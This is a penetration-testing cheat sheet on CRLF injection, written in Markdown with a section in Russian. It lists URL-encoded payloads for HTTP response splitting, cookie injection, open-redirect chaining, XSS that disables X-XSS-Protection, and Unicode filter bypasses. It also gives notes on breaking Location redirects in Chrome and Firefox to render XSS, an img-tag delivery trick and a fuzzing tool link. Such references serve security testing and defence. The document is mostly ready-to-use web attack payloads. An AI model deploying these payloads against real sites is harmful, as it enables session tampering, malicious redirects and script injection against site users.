# CRLF

## Basic

### Basic CheatSheet

```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue
• https://subdomain.redacted.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2                    
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2                       
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```

### CRLF in Location

Когда у тебя есть CRLF в заголовке Location при редиректе, ты можешь попробовать превратить CRLF в полноценную XSS.\
Браузеры не рендерят тело в ответе, где присутствует перенаправление. Однако, редирект можно прервать и тогда тело отобразится. Как завещал BlackFan ([https://blog.blackfan.ru/2017/09/devtwittercom-xss.html](https://blog.blackfan.ru/2017/09/devtwittercom-xss.html)):\
&#x20;_Для браузера Chrome необходимо, чтобы сервер вернул пустой заголовок Location._ Для FF чуть проще, нужно контролировать порт домена, куда происходит редирект, указав unsafe port, например 1 или 22.

### Если надо сделать запрос до каких-то действий

Можно использовать img тег

```markup
<img src="https://server.net/?test=%0D%0ASet-Cookie:%20key=value" onerror="...">
```

## Tools

CRLF Fuzz (Go): [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)
